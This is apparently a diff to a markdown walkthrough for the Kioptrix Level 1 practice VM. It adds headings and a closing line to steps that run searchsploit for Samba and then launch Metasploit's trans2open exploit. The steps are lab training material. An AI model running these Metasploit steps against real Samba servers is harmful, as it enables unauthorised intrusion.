@@ -20,7 +20,7 @@ The searchsploit command is designed to uncover valuable information within the 
 searchsploit samba
 ```
 # 3. Exploitation:
-The following commands can be used to launch Metasploit.
+## The following commands can be used to launch Metasploit.
 execute 
 ```bash 
 sudo msfconsole
@@ -29,17 +29,18 @@ sudo msfconsole
 ```bash
 search samba version command to search exploit
 ```
-Use 
+## Use 
 ```bash 
 exploit/linux/samba/trans2open
 ```
+We can use options command to see the options.
 
 ```bash
 Options
 ```
 We can use options command to see the options.
 
-Use:-
+## Use:-
 msf exploit(linux/samba/trans2open) >
 
 ```bash
@@ -58,7 +59,7 @@ msf exploit(linux/samba/trans2open) >
 ```bash 
 exploit
 ```
-
+# Congratulations, you've conquered Kioptrix Level 1!
 
 
 
